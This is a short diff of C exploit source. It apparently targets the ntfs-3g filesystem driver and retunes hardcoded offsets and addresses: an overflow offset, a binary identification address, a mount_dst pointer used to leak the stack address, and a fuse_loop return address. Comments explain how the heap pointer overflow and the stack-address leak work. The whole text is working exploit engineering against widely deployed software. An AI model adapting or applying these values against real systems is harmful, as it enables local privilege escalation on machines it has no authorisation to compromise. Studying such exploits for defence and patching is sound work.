@@ -28,17 +28,17 @@ char *paths[] = {
 
 // With ntfs prepared offset 0 it matches bytes of 0x408660 with offset 0xffbc19a0
 // Offset to overflow the pointer back to address 0x00
-#define OFFSET_OVERFLOW 0xffbc19a0
+#define OFFSET_OVERFLOW 0xffbb19a0
 
 // Part of /bin/ntfs-3g which can be used to check if the attribute offset is correct
 // Which attribute offset will be correct depends on which address we'll get during heap allocation
 // If it's correct we can switch to another file with a different attribute offset
-#define ADDR_IDENT 0x408660
+#define ADDR_IDENT 0x406494
 
 // Offset to a mount_dst string pointer
 // It's stored in ntfs-3g data section (which address is static) and points to the
 // stack, so it can be used to obtain the stack address
-#define ADDR_MOUNT_DST_PTR 0x4189e4
+#define ADDR_MOUNT_DST_PTR 0x4189e0
 
 // Address of the fuse_loop return address that should be on the stack
 #define FUSE_LOOP_RET_ADDR "\x00\x40\x64\xa4"
